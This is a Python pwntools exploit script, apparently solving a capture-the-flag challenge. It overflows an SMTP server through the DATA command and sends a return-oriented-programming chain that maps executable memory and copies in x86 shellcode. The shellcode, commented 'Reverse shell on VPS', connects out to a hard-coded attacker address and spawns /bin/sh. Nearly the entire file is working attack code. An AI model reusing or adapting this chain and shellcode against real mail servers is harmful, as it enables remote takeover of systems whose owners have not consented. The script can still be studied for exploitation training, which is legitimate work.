# import smtplib
from pwn import remote, p32

"""
* Rop start @ 0x8049542 <handle_smtp+929> ret

* https://code.woboq.org/userspace/glibc/sysdeps/unix/sysv/linux/bits/mman-linux.h.html

/* Sharing types (must choose one and only one of these).  */
#define MAP_SHARED        0x01                /* Share changes.  */
#define MAP_PRIVATE        0x02                /* Changes are private.  */

#define PROT_READ        0x1                /* Page can be read.  */
#define PROT_WRITE       0x2                /* Page can be written.  */
#define PROT_EXEC        0x4                /* Page can be executed.  */

Args:
1.ebx
2.ecx
3.edx
4.esi
5.edi

"""
# 0x0808eb1c : pop eax ; pop ebx ; pop ebp ; pop esi ; pop edi ; ret
LOAD_REGS_GADGET = 0x0808EB1C

# 0x8097f26 : add esp, 0x10 ; pop ebx ; pop esi ; pop edi ; ret
STACK_NIBBLER = 0x8097F26

# 0x08077ebf : add esp, 0x10 ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
LOAD_EAX_IN_EBP_AFTER_PUSHA = 0x08077EBF
# 0x0805b133 : add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
LOAD_EAX_IN_EBP_AFTER_PUSHA = 0x0805B133

# 0x0805a6cd : eax ; add esp, 0x18 ; pop ebx ; ret
LOAD_EAX_IN_EBX_AFTER_PUSHA = 0x0805A6CD

# 0x8063c17: ret 0xc
RET_0XC = 0x8063C17
# 0x0809aa5e : ret 0x10
RET_0X10 = 0x0809AA5E

# 0x08061d36 : pop edx ; ret
POP_EDX = 0x08061D36
RET = 0x08061D37

# 0x08061d5d : pop ecx ; pop ebx ; ret
POP_ECX_EDX = 0x08061D5D

# 0x08051aa4 : jmp eax
JMP_EAX = 0x08051AA4

# 0x80a8f46: push esp; ret
PUSH_ESP = 0x80A8F46

# 0x08048115 : pop ebx ; ret
POP_EBX = 0x08048115

# 0x080482d8 : pop edi ; ret
POP_EDI = 0x080482D8

# 0x0804a305 : pop esi ; ret
POP_ESI = 0x0804A305

# 0x8061d5d: pop ecx ; pop ebx ; ret
POP_ECX_EBX = 0x8061D5D

# 0x080aab68 : pop eax ; pop ebx ; pop esi ; ret
POP_EAX_EBX_ESI = 0x080AAB68

# 0x08062a8c : pushal ; ret
# Push EAX, ECX, EDX, EBX, original ESP, EBP, ESI, and EDI
PUSHA = 0x08062A8C

# 0x0805d97b : mov edi, edx ; ret
MOV_EDI_EDX = 0x0805D97B

# 0x8061c70 : int 0x80 ; mov ebx,edx ; cmp eax,0xffffff83 ;
#             jae 0x80633d0 <__syscall_error>; ret
# syscall in setsockopts
SYSCALL = 0x08061C70

# 0x8053c60 : sub ebp, eax ; jmp 0x8053bf2
#    0x8053bf2 <_IO_new_file_xsputn+114>:	mov    eax,ebx
#    0x8053bf4 <_IO_new_file_xsputn+116>:	sub    eax,ebp
#    0x8053bf6 <_IO_new_file_xsputn+118>:	add    esp,0x1c
#    0x8053bf9 <_IO_new_file_xsputn+121>:	pop    ebx
#    0x8053bfa <_IO_new_file_xsputn+122>:	pop    esi
#    0x8053bfb <_IO_new_file_xsputn+123>:	pop    edi
#    0x8053bfc <_IO_new_file_xsputn+124>:	pop    ebp
#    0x8053bfd <_IO_new_file_xsputn+125>:	ret
SUB_EBP_EDI_JUMP_ECX = 0x080D3880

# Functions
MPROTECT = 0x08060C10
MEMCPY = 0x0805DC40
MMAP = 0x08060B40

# Defines
PROT_READ = 1
PROT_WRITE = 2
PROT_EXEC = 4
MAP_SHARED = 1
MAP_PRIVATE = 2
MAP_ANONYMOUS = 0x20

# Setup connection and so on
p = remote("smtp-666mww.inst.malicecyber.com", 4444)
# p = remote("localhost", 4444)
p.send(b"HELO\r\n")
print(p.recv())
p.send(b"MAIL FROM: <auteur@yyyy.yyyy>\r\n")
print(p.recv())
p.send(b"RCPT TO: <dga-mi-bruz.recrutement.fct@intradef.gouv.fr>\r\n")
print(p.recv())
p.send(b"DATA\r\n")
print(p.recv())

# Pwn all ze komputerz
p.send(
    b"Subject: Test\r\n\r\n"
    # Size of b"AAAABBBBCCCCDDDD\r\n", 18 bytes
    + b"\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\r\n"
    + b"AAAABBBBCCCCDDDD\r\n" * 55
    + b"PADDING_LOL"
    #
    # Allocate a new memory location with proper permissions with mmap()
    #
    + p32(MMAP)
    + p32(STACK_NIBBLER)  # comsumes mmap arguments on the stack + 1
    + p32(0x00000000)  # void *addr
    + p32(0x00001000)  # size_t len
    + p32(PROT_READ | PROT_WRITE | PROT_EXEC)  # int prot
    + p32(MAP_ANONYMOUS | MAP_PRIVATE)  # int flags
    + p32(0x00000000)  # int fildes
    + p32(0x00000000)  # off_t off
    + p32(0xABCDABCD)  # padding
    #
    # Prepare EDI for next gadget
    #
    + p32(POP_EDI)
    + p32(LOAD_EAX_IN_EBP_AFTER_PUSHA)
    + p32(PUSHA)
    #
    # New pointer is now in a register (EBP)
    #
    # --- --- --- --- --- --- --- --- --- --- --- --- ---
    + p32(POP_ESI)
    + p32(JMP_EAX)
    #
    # Setup memcpy parameters
    #
    + p32(POP_EBX)
    + p32(0x1337)
    #
    # Copy shellcode to allocated memory
    #
    + p32(POP_EDI)
    + p32(MEMCPY)
    + p32(PUSHA)
    #############################
    #
    # Spill registers on the stack to fetch the pointer in eax into ebp
    #
    # + p32(0xCCCCCCCC)
    # Reverse shell on VPS
    + b"\x31\xc0\xb0\x66\x31\xdb\x43\x31\xc9\x51\x53\x6a"
    + b"\x02\x89\xe1\xcd\x80\x96\x31\xc0\x43\x68\x33\x4b"
    + b"\xa0\x1e\x66\x68\x11\x5c\x66\x53\x89\xe1\x6a\x10"
    + b"\x51\x56\x89\xe1\x43\xb0\x66\xcd\x80\x87\xde\x31"
    + b"\xc9\xb0\x3f\xcd\x80\x41\x80\xf9\x04\x75\xf6\x31"
    + b"\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
    + b"\x89\xe3\xb0\x0b\x31\xc9\xcd\x80"
    + b"\r\n"
    + b"XXXXSHELLCODE????\r\n"
    + b".\r\n"
)

print(p.recv())
p.interactive()
